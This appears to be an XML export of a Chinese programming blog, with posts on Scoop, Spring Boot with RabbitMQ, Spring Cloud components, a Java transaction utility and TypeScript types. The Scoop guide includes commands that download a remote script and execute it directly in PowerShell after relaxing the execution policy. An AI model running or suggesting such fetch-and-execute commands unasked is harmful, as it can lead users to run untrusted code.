        if ((scale &gt; 0) &amp;&amp; (!(scale % 10 &gt; 0))) &#123;
            numIndex &#x3D; 1;
            number &#x3D; number &#x2F; 10;
            getZero &#x3D; true;
        &#125;
        int zeroSize &#x3D; 0;
        while (true) &#123;
            if (number &lt;&#x3D; 0) &#123;
                break;
            &#125;
            &#x2F;&#x2F; 每次获取到最后一个数
            numUnit &#x3D; (int) (number % 10);
            if (numUnit &gt; 0) &#123;
                if ((numIndex &#x3D;&#x3D; 9) &amp;&amp; (zeroSize &gt;&#x3D; 3)) &#123;
                    sb.insert(0, CN_UPPER_MONETRAY_UNIT[6]);
                &#125;
                if ((numIndex &#x3D;&#x3D; 13) &amp;&amp; (zeroSize &gt;&#x3D; 3)) &#123;
                    sb.insert(0, CN_UPPER_MONETRAY_UNIT[10]);
                &#125;
                sb.insert(0, CN_UPPER_MONETRAY_UNIT[numIndex]);
                sb.insert(0, CN_UPPER_NUMBER[numUnit]);
                getZero &#x3D; false;
                zeroSize &#x3D; 0;
            &#125; else &#123;
                ++zeroSize;
                if (!(getZero)) &#123;
                    sb.insert(0, CN_UPPER_NUMBER[numUnit]);
                &#125;
                if (numIndex &#x3D;&#x3D; 2) &#123;
                    if (number &gt; 0) &#123;
                        sb.insert(0, CN_UPPER_MONETRAY_UNIT[numIndex]);
                    &#125;
                &#125; else if (((numIndex - 2) % 4 &#x3D;&#x3D; 0) &amp;&amp; (number % 1000 &gt; 0)) &#123;
                    sb.insert(0, CN_UPPER_MONETRAY_UNIT[numIndex]);
                &#125;
                getZero &#x3D; true;
            &#125;
            &#x2F;&#x2F; 让number每次都去掉最后一个数
            number &#x3D; number &#x2F; 10;
            ++numIndex;
        &#125;
        &#x2F;&#x2F; 如果signum &#x3D;&#x3D; -1，则说明输入的数字为负数，就在最前面追加特殊字符：负
        if (signum &#x3D;&#x3D; -1) &#123;
            sb.insert(0, CN_NEGATIVE);
        &#125;
        &#x2F;&#x2F; 输入的数字小数点后两位为&quot;00&quot;的情况，则要在最后追加特殊字符：整
        if (!(scale &gt; 0)) &#123;
            sb.append(CN_FULL);
        &#125;
        return sb.toString();
    &#125;

&#125;
]]></content>
  </entry>
  <entry>
    <title>Scoop不完全上手指南</title>
    <url>/2021/03/19/Scoop%E4%B8%8D%E5%AE%8C%E5%85%A8%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[Scoop 是什么借用 Mike Zick 对 Cygwin 和 MSYS 的描述，他对 Scoop 作了一个类比描述：

Scoop is an installer
The goal of Scoop is to let you use Unix-y programs in a normal Windows environment

并且他也称，Scoop 并不是一个包管理器，而是通过读取 JSON 描述文件来安装程序及其依赖。Scoop 专注于开源和命令行开发工具，不符合其标准的不可能进入 main bucket（Scoop 安装后便自带的），因而虽然通过 scoop install skype 也能安装 Skype，但是只能放在 extra bucket 中。


在与 Chocolatey 对比时，他提到了 Scoop 的一些特性，其中不乏吸引我选择使用它而非前者的因素。

Scoop 默认安装在用户文件夹下（~/scoop/），那么在权限方面就很友好，安装程序时不会跳出 UAC 提醒，不需要管理员权限。
不会对路径造成污染。像是平常手动安装以及通过 Chocolatey 安装程序时，安装目录散落各地，有在 C:/Program Files 和 C:/Program Files (x86) 的，也有在 C:/Users/&lt;username&gt;/AppData 的，还有在 C:/ProgramData 的。其实这些安装位置都是跟 “install for all users” 和 “install only for me” 的区别有关的，背后对应的是不同的权限（我瞎说的），但是看上去非常乱也不好管理。Scoop 则是将程序的 shims（我理解为指向所安装软件当前版本的快捷方式，非科班的我面对这些术语流下了眼泪）集中放在一个文件夹中统一管理，并将其添加至环境变量。
相比包管理器和应用仓库更简单（simpler）。使用 Scoop 最简单的形式只需 Git + JSON 就够了，通过 Git 读取同步 repo 中描述如何安装某个程序的文件（里面写明了程序的版本、下载地址、解压目录、bin 及安装前后的工作等），然后 scoop install &lt;app&gt; 完事。
可安装程序的某个特定版本并可以在版本间切换。如 scoop install python27 便可以安装 Python 2.7 版本（当然得先通过 scoop bucket add versions 添加 versions bucket），同时 scoop install python 安装的则是 Python 的最新版本。

安装 Scoop其实安装之前，应该先将 Scoop 中的几个重要概念讲清楚的，比如上面多次提到的 bucket。但是，既然是上手指南，实用为先，概念可以暂先这样理解：所谓 app 就是要安装的一个应用程序，app manifest 则是含有某个应用程序安装信息（如上所述，程序版本、下载地址等）的 JSON 文件，bucket 则是存放这些 manifest 的 repo（如托管在 GitHub 上的 main bucket）。
首先，唤出 PowerShell（Windows 10 下都可以），set-executionpolicy remotesigned -scope currentuser，然后选择允许（Y）执行本地脚本。

如果是想安装在默认位置，即 C:/Users/&lt;username&gt;/scoop 的话，直接运行

Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;get.scoop.sh&#39;)

或者 iwr -useb get.scoop.sh | iex 即可。

如果是想自定义安装位置，如 D:/Scoop，那么逐条运行下面命令

$env:SCOOP&#x3D;&#39;D:\Scoop&#39;
[environment]::setEnvironmentVariable(&#39;SCOOP&#39;,$env:SCOOP,&#39;User&#39;)
iwr -useb get.scoop.sh | iex

至于如何安装全局应用到自定义目录就先不说了。至此，如无报错信息，Scoop 安装完成。
卸载 Scoop卸载非常简单，只需运行 scoop uninstall scoop 即可。
使用 Scoop记得随时使用 scoop help 查看帮助信息
scoop search查找软件，通常是想看看某个程序是否可以通过 Scoop 安装
scoop search &lt;app&gt;

如
scoop search python

scoop install安装应用程序，分两种情况：

只为当前用户安装，安装在 Scoop 目录下的 apps 文件夹

scoop install &lt;app&gt;

如
scoop install python


为所有用户安装，默认安装在 C:/ProgramData/scoop 或者是上文提到的自定义的全局应用安装目录，并且需要以管理员身份运行

scoop install &lt;app&gt; -g

如
scoop install python -g

如果要安装特定版本的应用，比如说 curl 7.56.1，则应该这样
scoop install curl@7.56.1

scoop uninstall卸载某一程序
scoop uninstall &lt;app&gt;

如
scoop uninstall python

卸载程序并移除所有配置文件
scoop uninstall &lt;app&gt; -p

如
scoop uninstall python -p

卸载全局安装的应用程序，需以管理员身份运行
scoop uninstall &lt;app&gt; -g

如
scoop uninstall python -g

scoop update更新 Scoop 及所有 bucket 但不更新 app
scoop update

更新某一特定程序
scoop update &lt;app&gt;

如
scoop update python

更新 Scoop、bucket 及所有程序
scoop update *

更新全局安装的程序，需要以管理员身份运行
scoop update &lt;app&gt; -g

如
scoop update python -g

scoop list查看已安装的程序
scoop list

scoop status查看哪些程序可以升级
scoop status

scoop config需要设置的一般也就是两个，aria2 开关以及 proxy 设置
开闭 aria2 scoop config aria2-enabled true or scoop config aria2-enabled false，但不建议开启，经常有各种奇奇怪怪的问题。同时，启用 aria2 前需要先安装 scoop install aria2
proxy 设置，如 scoop config proxy 127.0.0.1:1080
scoop home查看某一程序的主页
scoop home &lt;app&gt;

如
scoop home python

便唤起浏览器，打开 Python 官网
scoop reset借用 Wiki 例子
# 先添加 versions bucket
scoop bucket add versions

# 同时安装 Python 2.7 和最新版本
scoop install python27 python

# 切换到 Python 2.7.x
scoop reset python27

# 切换到 Python 3.x
scoop reset python

scoop cleanup删除已安装软件的旧版本，如删除所有软件旧版本
scoop cleanup *

scoop cache清理软件缓存，通常是下载的软件安装包。以下命令清除所有缓存，即清空 Scoop 目录下的 cache 文件夹
scoop cache rm *

scoop bucket查看「已知库」
scoop bucket known

查看已经添加的库
scoop bucket list

删除已经添加的库
scoop bucket rm &lt;bucket&gt;

添加库，分两种情况：

添加「已知库」

scoop bucket add &lt;bucket&gt;

如添加上文提到的 versions 库
scoop bucket add versions


添加第三方库

scoop bucket add &lt;bucket&gt; &lt;bucket_url&gt;

如添加 Ash258、chawyehsu 和我的库
scoop bucket add Ash258 https:&#x2F;&#x2F;github.com&#x2F;Ash258&#x2F;Scoop-Ash258.git
scoop bucket add dorado https:&#x2F;&#x2F;github.com&#x2F;chawyehsu&#x2F;dorado.git
scoop bucket add spoon https:&#x2F;&#x2F;github.com&#x2F;FDUZS&#x2F;spoon.git

Scoop 进阶看完以上内容，入门足够。我也刚使用不到半年，认为进阶需要搞懂以下几点：

App Manifest 创建并可以实现「自动更新」
“Current” 文件夹及背后设计思路
找出其设计缺陷之处，即让你不爽的点


转载说明：本文作者： Zheng Shuai本文链接： https://www.iamzs.top/archives/scoop-guidebook.html

]]></content>
      <tags>
        <tag>scoop</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot集成RabbitMQ入门使用</title>
    <url>/2021/05/10/SpringBoot%E9%9B%86%E6%88%90RabbitMQ%E5%85%A5%E9%97%A8%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[添加依赖&lt;dependency&gt;
  &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;
  &lt;artifactId&gt;spring-boot-starter-amqp&lt;&#x2F;artifactId&gt;
&lt;dependency&gt;

配置信息


属性
描述



spring.rabbitmq.addresses
逗号分隔的RabbitMQ代理地址列表


spring.rabbitmq.host
代理的主机（默认为localhost）


spring.rabbitmq.port
代理的端口（默认为5672）


spring.rabbitmq.username
访问代理所使用的用户名（可选）


spring.rabbitmq.password
访问代理所使用的密码（可选）


spring.rabbitmq.template.exchange
设置默认的Exchange（可选）


spring.rabbitmq.template.routing-key
设置默认的Routing-Key（可选）


spring.rabbitmq.template.receive-timeout
设置默认超时时间（可选）




通过RabbitTemplate发送消息&#x2F;&#x2F; 发送原始的消息
void send(Message message) throws AmqpException;
void send(String routingKey, Message message) throws AmqpException;
void send(String exchange, String routingKey, Message message) throws AmqpException;

&#x2F;&#x2F; 发送根据对象转换而成的消息
void convertAndSend(Object message) throws AmqpException;
void convertAndSend(String routingKey, Object message) throws AmqpException;
void convertAndSend(String exchange, String routingKey, Object message) throws AmqpException;

&#x2F;&#x2F; 发送根据对象转换而成的消息并且带有后期处理的功能
void convertAndSend(Object message, MessagePostProcessor mPP) throws AmqpException;
void convertAndSend(String routingKey, Object message, MessagePostProcessor mPP) throws AmqpException;
void convertAndSend(String exchange, String routingKey, Object message, MessagePostProcessor mPP) throws AmqpException;

代码示例
@Service
public class RabbitOrderMessagingService implements OrderMessagingService &#123;
    private RabbitTemplate rabbit;

    @Autowired
    public RabbitOrderMessagingService(RabbitTemplate rabbit) &#123;
        this.rabbit &#x3D; rabbit;
    &#125;

    public void sendOrder(Order order) &#123;
        MessageConverter converter &#x3D; rabbit.getMessageConverter();
        MessageProperties props &#x3D; new MessageProperties();
        Message message &#x3D; converter.toMessage(order, props);
        rabbit.send(&quot;tacocloud.order&quot;, message);
    &#125;
&#125;

配置消息转换器
Jackson2JsonMessageConverter 使用Jackson2JSON实现对象和JSON的相互转换
MarshallingMessageConverter 使用Spring的Marshaller和Unmarshaller进行转换
SerializerMessageConverter 使用Spring的Serializer和Deserializer转换String和任意种类的原生对象
SimpleMessageConverter 转换String、字节数组和Serializable类型
ContentTypeDelegatingMessageConverter 基于contentType头信息，讲转换功能委托给另外一个MessageConverter
MessaagingMessageConverter 将消息转换功能委托为另外一个MessageConverter，并将头信息的转换委托给AmqpHeaderConverter

设置消息属性通过send方法
public void sendOrder(Order order) &#123;
    MessageConverter converter &#x3D; rabbit.getMessageConverter();
    MessageProperties props &#x3D; new MessageProperties();
    props.setHeader(&quot;X_ORDER_SOURCE&quot;, &quot;WEB&quot;);
    Message message &#x3D; converter.toMessage(order, props);
    rabbit.send(&quot;tacocloud.order&quot;, message);
&#125;

通过convertAndSend方法
@Override
public void sendOrder(Order order) &#123;
    rabbit.convertAndSend(&quot;tacocloud.order.queue&quot;, order,
        new MessagePostProcessor() &#123;
            @Override
            public Message postProcessMessage(Message message) throws AmqpException &#123;
                MessageProperties props &#x3D; message.getMessageProperties();
                props.setHeader(&quot;X_ORDER_SOURCE&quot;, &quot;WEB&quot;);
                return message;
            &#125;
        &#125;);
&#125;

接受来自RabbitMQ的消息
使用RabbitTemplate从队列拉取消息
将消息推送至带有@RabbitListener注解的方法

使用RabbitTemplate接收消息@Component
public class RabbitOrderReceiver &#123;
    private RabbitTemplate rabbit;
    private MessageConverter converter;

    @Autowired
    public RabbitOrderReceiver(RabbitTemplate rabbit) &#123;
        this.rabbit &#x3D; rabbit;
        this.converter &#x3D; rabbit.getMessageConverter();
    &#125;

    public Order receiveOrder() &#123;
        &#x2F;&#x2F; 延时等待返回
        &#x2F;&#x2F; Message message &#x3D; rabbit.receive(&quot;tacocloud.orders&quot;, 300000);

        &#x2F;&#x2F; 无等待返回
        Message message &#x3D; rabbit.receive(&quot;tacocloud.orders&quot;);

        &#x2F;&#x2F; 手动转换
        &#x2F;&#x2F; return message !&#x3D; null ? (Order) converter.fromMessage(message) : null;

        &#x2F;&#x2F; 自动转换
        return (Order) rabbit.receiveAndConvert(&quot;tacocloud.order.queue&quot;);
        &#x2F;&#x2F; 另一种自动转换写法
        &#x2F;&#x2F; return rabbit.receiveAndConvert(&quot;tacocloud.order.queue&quot;, new ParamterizedTypeReference&lt;Order&gt;() &#123;&#125;);
    &#125;
&#125;

使用监听器处理RabbitMQ的消息@Component
public class OrderListener &#123;
    private KitchenUI ui;

    @Autowired
    public OrderListener(KitchenUI ui) &#123;
        this.ui &#x3D; ui;
    &#125;

    &#x2F;&#x2F; 当消息抵达RabbitMQ队列时该方法应该被调用
    @RabbitListener(queues &#x3D; &quot;tacocloud.order.queue&quot;)
    public void receiveOrder(Order order) &#123;
        ui.displayOrder(order);
    &#125;
&#125;

]]></content>
      <tags>
        <tag>SpringBoot</tag>
        <tag>RabbitMQ</tag>
        <tag>消息队列</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud基础介绍</title>
    <url>/2021/05/24/SpringCloud%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[概述毫无疑问，Spring Cloud 是目前微服务架构领域的翘楚，无数的书籍博客都在讲解这个技术。不过大多数讲解还停留在对 Spring Cloud 功能使用的层面，其底层的很多原理，很多人可能并不知晓。因此本文将通过大量的手绘图，给大家谈谈 Spring Cloud 微服务架构的底层原理。
实际上，Spring Cloud 是一个全家桶式的技术栈，包含了很多组件。本文先从其最核心的几个组件入手，来剖析一下其底层的工作原理。也就是 Eureka、Ribbon、Feign、Hystrix、Zuul 这几个组件。


一、业务场景介绍先来给大家说一个业务场景，假设咱们现在开发一个电商网站，要实现支付订单的功能，流程如下：

  创建一个订单后，如果用户立刻支付了这个订单，我们需要将订单状态更新为 “已支付”
  扣减相应的商品库存
  通知仓储中心，进行发货
  给用户的这次购物增加相应的积分

针对上述流程，我们需要有订单服务、库存服务、仓储服务、积分服务。整个流程的大体思路如下：

  用户针对一个订单完成支付之后，就会去找订单服务，更新订单状态
  订单服务调用库存服务，完成相应功能
  订单服务调用仓储服务，完成相应功能
  订单服务调用积分服务，完成相应功能

至此，整个支付订单的业务流程结束
下图这张图，清晰表明了各服务间的调用过程：

好！有了业务场景之后，咱们就一起来看看 Spring Cloud 微服务架构中，这几个组件如何相互协作，各自发挥的作用以及其背后的原理。
二、Spring Cloud 核心组件：Eureka咱们来考虑第一个问题：订单服务想要调用库存服务、仓储服务，或者积分服务，怎么调用？

  订单服务压根儿就不知道人家库存服务在哪台机器上啊！他就算想要发起一个请求，都不知道发送给谁，有心无力！
  这时候，就轮到 Spring Cloud Eureka 出场了。Eureka 是微服务架构中的注册中心，专门负责服务的注册与发现。

咱们来看看下面的这张图，结合图来仔细剖析一下整个流程：

如上图所示，库存服务、仓储服务、积分服务中都有一个 Eureka Client 组件，这个组件专门负责将这个服务的信息注册到 Eureka Server 中。说白了，就是告诉 Eureka Server，自己在哪台机器上，监听着哪个端口。而Eureka Server 是一个注册中心，里面有一个注册表，保存了各服务所在的机器和端口号
订单服务里也有一个 Eureka Client 组件，这个 Eureka Client 组件会找 Eureka Server 问一下：库存服务在哪台机器啊？监听着哪个端口啊？仓储服务呢？积分服务呢？然后就可以把这些相关信息从 Eureka Server 的注册表中拉取到自己本地缓存起来。
这时如果订单服务想要调用库存服务，不就可以找自己本地的 Eureka Client 问一下库存服务在哪台机器？监听哪个端口吗？收到响应后，紧接着就可以发送一个请求过去，调用库存服务扣减库存的那个接口！同理，如果订单服务要调用仓储服务、积分服务，也是如法炮制。
总结一下：

  Eureka Client：负责将这个服务的信息注册到 Eureka Server 中
  Eureka Server：注册中心，里面有一个注册表，保存了各个服务所在的机器和端口号

三、Spring Cloud 核心组件：Feign现在订单服务确实知道库存服务、积分服务、仓库服务在哪里了，同时也监听着哪些端口号了。但是新问题又来了：难道订单服务要自己写一大堆代码，跟其他服务建立网络连接，然后构造一个复杂的请求，接着发送请求过去，最后对返回的响应结果再写一大堆代码来处理吗？
这是上述流程翻译的代码片段，咱们一起来看看，体会一下这种绝望而无助的感受！！！
友情提示，前方高能：

看完上面那一大段代码，有没有感到后背发凉、一身冷汗？实际上你进行服务间调用时，如果每次都手写代码，代码量比上面那段要多至少几倍，所以这个事压根儿就不是地球人能干的。
既然如此，那怎么办呢？别急，Feign 早已为我们提供好了优雅的解决方案。来看看如果用 Feign 的话，你的订单服务调用库存服务的代码会变成啥样？

看完上面的代码什么感觉？是不是感觉整个世界都干净了，又找到了活下去的勇气！没有底层的建立连接、构造请求、解析响应的代码，直接就是用注解定义一个 FeignClient 接口，然后调用那个接口就可以了。人家 Feign Client 会在底层根据你的注解，跟你指定的服务建立连接、构造请求、发起靕求、获取响应、解析响应，等等。这一系列脏活累活，人家 Feign 全给你干了。
那么问题来了，Feign 是如何做到这么神奇的呢？很简单，Feign 的一个关键机制就是使用了动态代理。咱们一起来看看下面的图，结合图来分析：

  首先，如果你对某个接口定义了 @FeignClient 注解，Feign 就会针对这个接口创建一个动态代理
  接着你要是调用那个接口，本质就是会调用 Feign 创建的动态代理，这是核心中的核心
  Feign 的动态代理会根据你在接口上的 @RequestMapping 等注解，来动态构造出你要请求的服务的地址
  最后针对这个地址，发起请求、解析响应


四、Spring Cloud 核心组件：Ribbon说完了 Feign，还没完。现在新的问题又来了，如果人家库存服务部署在了 5 台机器上，如下所示：

  192.168.169:9000
  192.168.170:9000
  192.168.171:9000
  192.168.172:9000
  192.168.173:9000

这下麻烦了！人家 Feign 怎么知道该请求哪台机器呢？

  这时 Spring Cloud Ribbon 就派上用场了。Ribbon 就是专门解决这个问题的。它的作用是负载均衡，会帮你在每次请求时选择一台机器，均匀的把请求分发到各个机器上
  Ribbon 的负载均衡默认使用的最经典的 Round Robin 轮询算法。这是啥？简单来说，就是如果订单服务对库存服务发起 10 次请求，那就先让你请求第 1 台机器、然后是第 2 台机器、第 3 台机器、第 4 台机器、第 5 台机器，接着再来—个循环，第 1 台机器、第 2 台机器。。。以此类推。

此外，Ribbon 是和 Feign 以及 Eureka 紧密协作，完成工作的，具体如下：

  首先 Ribbon 会从 Eureka Client 里获取到对应的服务注册表，也就知道了所有的服务都部署在了哪些机器上，在监听哪些端口号。
  然后 Ribbon 就可以使用默认的 Round Robin 算法，从中选择一台机器
  Feign 就会针对这台机器，构造并发起请求。

对上述整个过程，再来一张图，帮助大家更深刻的理解：

五、Spring Cloud 核心组件：Hystrix在微服务架构里，一个系统会有很多的服务。以本文的业务场景为例：订单服务在一个业务流程里需要调用三个服务。现在假设订单服务自己最多只有 100 个线程可以处理请求，然后呢，积分服务不幸的挂了，每次订单服务调用积分服务的时候，都会卡住几秒钟，然后抛出—个超时异常。
咱们一起来分析一下，这样会导致什么问题？

 如果系统处于高并发的场景下，大量请求涌过来的时候，订单服务的 100 个线程都会卡在请求积分服务这块。导致订单服务没有一个线程可以处理请求
 然后就会导致别人请求订单服务的时候，发现订单服务也挂了，不响应任何请求了

上面这个，就是微服务架构中恐怖的服务雪崩问题，如下图所示：

如上图，这么多服务互相调用，要是不做任何保护的话，某一个服务挂了，就会引起连锁反应，导致别的服务也挂。比如积分服务挂了，会导致订单服务的线程全部卡在请求积分服务这里，没有一个线程可以工作，瞬间导致订单服务也挂了，别人请求订单服务全部会卡住，无法响应。
但是我们思考一下，就算积分服务挂了，订单服务也可以不用挂啊！为什么？

  我们结合业务来看：支付订单的时候，只要把库存扣减了，然后通知仓库发货就 OK 了
  如果积分服务挂了，大不了等他恢复之后，慢慢人肉手工恢复数据！为啥一定要因为一个积分服务挂了，就直接导致订单服务也挂了呢？不可以接受！

现在问题分析完了，如何解决？
这时就轮到 Hystrix 闪亮登场了。Hystrix 是隔离、熔断以及降级的一个框架。啥意思呢？说白了，Hystrix 会搞很多个小小的线程池，比如订单服务请求库存服务是一个线程池，请求仓储服务是一个线程池，请求积分服务是一个线程池。每个线程池里的线程就仅仅用于请求那个服务。
打个比方：现在很不幸，积分服务挂了，会咋样？
当然会导致订单服务里那个用来调用积分服务的线程都卡死不能工作了啊！但由于订单服务调用库存服务、仓储服务的这两个线程池都是正常工作的，所以这两个服务不会受到任何影响。
这个时候如果别人请求订单服务，订单服务还是可以正常调用库存服务扣减库存，调用仓储服务通知发货。只不过调用积分服务的时候，每次都会报错。但是如果积分服务都挂了，每次调用都要去卡住几秒钟干啥呢？有意义吗？当然没有！所以我们直接对积分服务熔断不就得了，比如在 5 分钟内请求积分服务直接就返回了，不要去走网络请求卡住几秒钟，这个过程，就是所谓的熔断！
那人家又说，兄弟，积分服务挂了你就熔断，好歹你干点儿什么啊！别啥都不干就直接返回啊？没问题，咱们就来个降级：每次调用积分服务，你就在数据库里记录一条消息，说给某某用户增加了多少积分，因为积分服务挂了，导致没增加成功！这样等积分服务恢复了，你可以根据这些记录手工加一下积分。这个过程，就是所谓的降级。
为帮助大家更直观的理解，接下来用一张图，梳理一下 Hystrix 隔离、熔断和降级的全流程：

六、Spring Cloud 核心组件：Zuul说完了 Hystrix，接着给大家说说最后一个组件：Zuul，也就是微服务网关。这个组件是负责网络路由的。不懂网络路由？行，那我给你说说，如果没有 Zuul 的日常工作会怎样？
假设你后台部署了几百个服务，现在有个前端兄弟，人家请求是直接从浏览器那儿发过来的。打个比方：人家要请求一下库存服务，你难道还让人家记着这服务的名字叫做 inventory-service？部署在 5 台机器上？就算人家肯记住这一个，你后台可有几百个服务的名称和地址呢？难不成人家请求一个，就得记住一个？你要这样玩儿，那真是友谊的小船，说翻就翻！
上面这种情况，压根儿是不现实的。所以一般微服务架构中都必然会设计一个网关在里面，像 android、ios、pc 前端、微信小程序、H5 等等，不用去关心后端有几百个服务，就知道有一个网关，所有请求都往网关走，网关会根据请求中的一些特征，将请求转发给后端的各个服务。
而且有一个网关之后，还有很多好处，比如可以做统一的降级、限流、认证授权、安全，等等。
七、总结：最后再来总结一下，上述几个 Spring Cloud 核心组件，在微服务架构中，分别扮演的角色：

  Eureka：各个服务启动时，Eureka Client 都会将服务注册到 Eureka Server，并且 Eureka Client 还可以反过来从 Eureka Server 拉取注册表，从而知道其他服务在哪里
  Ribbon：服务间发起请求的时候，基于 Ribbon 做负载均衡，从一个服务的多台机器中选择一台
  Feign：基于 Feign 的动态代理机制，根据注解和选择的机器，拼接请求 URL 地址，发起请求
  Hystrix：发起请求是通过 Hystrix 的线程池来走的，不同的服务走不同的线程池，实现了不同服务调用的隔离，避免了服务雪崩的问题
  Zuul：如果前端、移动端要调用后端系统，统一从 Zuul 网关进入，由 Zuul 网关转发请求给对应的服务

以上就是我们通过一个电商业务场景，阐述了 Spring Cloud 微服务架构几个核心组件的底层原理。
文字总结还不够直观？没问题！我们将 Spring Cloud 的 5 个核心组件通过一张图串联起来，再来直观的感受一下其底层的架构原理：

参考：

  SpringCloud 微服务（原理篇）
  Spring Cloud 原理分析及使用
  面试必问的 SpringCloud 实现原理图
  面试必问的 SpringCloud 实现原理图


转载：https://blog.csdn.net/qq_41701956/article/details/83829539

]]></content>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud图解工作原理</title>
    <url>/2021/05/10/SpringCloud%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E5%9B%BE/</url>
    <content><![CDATA[引言面试中面试官喜欢问组件的实现原理，尤其是常用技术，我们平时使用了 SpringCloud 还需要了解它的实现原理，这样不仅起到举一反三的作用，还能帮助轻松应对各种问题及有针对的进行扩展。以下是《Java 深入微服务原理改造房产销售平台》课程讲到的部分原理附图，现在免费开放给大家，让大家轻松应对原理面试题。


服务注册发现组件 Eureka 工作原理
服务网关组件 Zuul 工作原理
跨域时序图
Eureka 与 Ribbon 整合工作原理
解决分布式一致性
级联故障流程
断路器组件 Hystrix 工作原理
分布式追踪 Sleuth 工作原理
SpringBoot 自动配置工作原理
《Java 深入微服务原理改造房产销售平台》是一门基于 SpringCloud 技术栈的微服务真实实战课程，里面涵盖了 SpringCloud 的大部分技术点，对 SpringCloud 技术进行深度探险，不仅学习到 SpringCloud 组件的实现原理，学完以后还可以将该项目完美包装到你的简历中，让您在众多竞争者脱颖而出。

转载：https://zhuanlan.zhihu.com/p/54634405

]]></content>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>TransactionUtil-java</title>
    <url>/2021/07/06/TransactionUtil-java/</url>
    <content><![CDATA[事务工具类


import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.datasource.DataSourceTransactionManager;
import org.springframework.stereotype.Service;
import org.springframework.transaction.TransactionDefinition;
import org.springframework.transaction.TransactionStatus;
import org.springframework.transaction.support.DefaultTransactionDefinition;
import org.springframework.transaction.support.TransactionSynchronizationAdapter;
import org.springframework.transaction.support.TransactionSynchronizationManager;

import java.util.concurrent.Callable;

@Service
public class TransactionUtil &#123;

    private static Logger log &#x3D; LoggerFactory.getLogger(TransactionUtil.class);

    @Autowired
    private DataSourceTransactionManager dataSourceTransactionManager;

    public &lt;T&gt; T doTransaction(Callable&lt;T&gt; job, Runnable rollback) &#123;
        DefaultTransactionDefinition def &#x3D; new DefaultTransactionDefinition();
        def.setPropagationBehavior(TransactionDefinition.PROPAGATION_REQUIRED);
        TransactionStatus status &#x3D; dataSourceTransactionManager.getTransaction(def);
        try &#123;
            T t &#x3D; job.call();
            dataSourceTransactionManager.commit(status);
            return t;
        &#125; catch (Exception e) &#123;
            dataSourceTransactionManager.rollback(status);
            if (rollback !&#x3D; null) &#123;
                rollback.run();
            &#125;
            log.error(e.getMessage(), e);
            throw new RuntimeException(e);
        &#125;
    &#125;

    public &lt;T&gt; T doTransaction(Callable&lt;T&gt; job) &#123;
        return doTransaction(job, null);
    &#125;

    &#x2F;**
    * 开启事务(PROPAGATION_REQUIRED)
    *&#x2F;
    public TransactionStatus begin() &#123;
        return getTransactionStatus(TransactionDefinition.PROPAGATION_REQUIRED);
    &#125;

    &#x2F;**
    * 开启事务(PROPAGATION_REQUIRES_NEW)
    *&#x2F;
    public TransactionStatus beginNew() &#123;
        return getTransactionStatus(TransactionDefinition.PROPAGATION_REQUIRES_NEW);
    &#125;

    &#x2F;**
    * 事务提交
    *&#x2F;
    public void commit(TransactionStatus status) &#123;
        dataSourceTransactionManager.commit(status);
    &#125;

    &#x2F;**
    * 事务回滚
    *&#x2F;
    public void rollback(TransactionStatus status) &#123;
        dataSourceTransactionManager.rollback(status);
    &#125;

    private TransactionStatus getTransactionStatus(int propagationRequiresNew) &#123;
        DefaultTransactionDefinition def &#x3D; new DefaultTransactionDefinition();
        def.setPropagationBehavior(propagationRequiresNew);
        TransactionStatus status &#x3D; dataSourceTransactionManager.getTransaction(def);
        return status;
    &#125;

    &#x2F;**
    * 判断当前线程是否处于事物中，是就等事物提交后再执行，否则直接执行
    * @param runnable 线程任务
    *&#x2F;
    public static void executeAfterCommit(Runnable runnable) &#123;
        if (TransactionSynchronizationManager.isActualTransactionActive()) &#123;
            TransactionSynchronizationManager.registerSynchronization(new TransactionSynchronizationAdapter() &#123;
                @Override
                public void afterCommit() &#123;
                    runnable.run();
                &#125;
            &#125;);
        &#125;else&#123;
            runnable.run();
        &#125;
    &#125;

&#125;
]]></content>
  </entry>
  <entry>
    <title>TypeScript入门手册</title>
    <url>/2021/07/03/TypeScript%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[基础类型
https://www.tslang.cn/docs/handbook/basic-types.html

布尔值let isDone: boolean &#x3D; false;

数字let decLiteral: number &#x3D; 6;
let hexLiteral: number &#x3D; 0xf00d;
let binaryLiteral: number &#x3D; 0b1010;
let octalLiteral: number &#x3D; 0o744;

字符串let name: string &#x3D; &quot;bob&quot;;

let name: string &#x3D; &#96;Gene&#96;;
let age: number &#x3D; 37;
let sentence: string &#x3D; &#96;Hello, my name is $&#123; name &#125;.
I&#39;ll be $&#123; age + 1 &#125; years old next month.&#96;;


数组let list: number[] &#x3D; [1, 2, 3];
let list: Array&lt;number&gt; &#x3D; [1, 2, 3];

元组 Tuple
元组类型允许表示一个已知元素数量和类型的数组，各元素的类型不必相同。 比如，你可以定义一对值分别为 string和number类型的元组。

&#x2F;&#x2F; Declare a tuple type
let x: [string, number];
&#x2F;&#x2F; Initialize it
x &#x3D; [&#39;hello&#39;, 10]; &#x2F;&#x2F; OK
&#x2F;&#x2F; Initialize it incorrectly
x &#x3D; [10, &#39;hello&#39;]; &#x2F;&#x2F; Error

console.log(x[0].substr(1)); &#x2F;&#x2F; OK
console.log(x[1].substr(1)); &#x2F;&#x2F; Error, &#39;number&#39; does not have &#39;substr&#39;

x[3] &#x3D; &#39;world&#39;; &#x2F;&#x2F; OK, 字符串可以赋值给(string | number)类型

console.log(x[5].toString()); &#x2F;&#x2F; OK, &#39;string&#39; 和 &#39;number&#39; 都有 toString

x[6] &#x3D; true; &#x2F;&#x2F; Error, 布尔不是(string | number)类型

枚举enum Color &#123;Red, Green, Blue&#125; &#x2F;&#x2F; Red 默认为 0
let c: Color &#x3D; Color.Green;

